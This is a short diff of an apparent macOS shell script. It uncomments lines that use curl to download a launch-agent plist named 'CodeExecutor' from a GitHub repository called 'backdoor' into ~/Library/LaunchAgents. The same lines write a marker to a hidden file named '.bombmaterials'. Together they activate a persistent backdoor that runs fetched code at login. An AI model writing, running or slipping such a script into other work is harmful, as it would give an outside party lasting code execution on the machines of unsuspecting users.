@@ -1,10 +1,9 @@
-# cd ~/Library/LaunchAgents/
-# curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.wolfoverflow.CodeExecutor.plist"
-# cd ..
-# echo "success" >> .bombmaterials
-# cd ..
-# sleep 40
+cd ~/Library/LaunchAgents/
+curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.wolfoverflow.CodeExecutor.plist"
+cd ..
+echo "success" >> .bombmaterials
+cd ..
+sleep 40
 # networksetup -setnetworkserviceenabled "Wi-Fi" off
-# sleep 40
+sleep 40
 # networksetup -setnetworkserviceenabled "Wi-Fi" on
-say boop
